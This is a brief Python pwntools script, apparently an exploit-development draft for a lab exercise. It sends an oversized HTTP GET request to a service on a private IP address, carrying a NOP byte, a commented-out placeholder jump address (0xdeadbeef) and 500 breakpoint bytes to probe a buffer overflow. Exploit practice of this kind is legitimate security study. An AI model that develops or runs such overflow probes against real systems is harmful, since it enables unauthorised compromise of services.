#!/usr/bin/python
from pwn import *
import struct

s = remote("192.168.135.133", 20001)

jmpAddress = struct.pack("I", 0xdeadbeef)
padding = "\x90" # + jmpAddress

payload = "\xCC"*500
s.sendline("GET {0} HTTP/1.1 {1}".format(padding, payload))

print s.recv()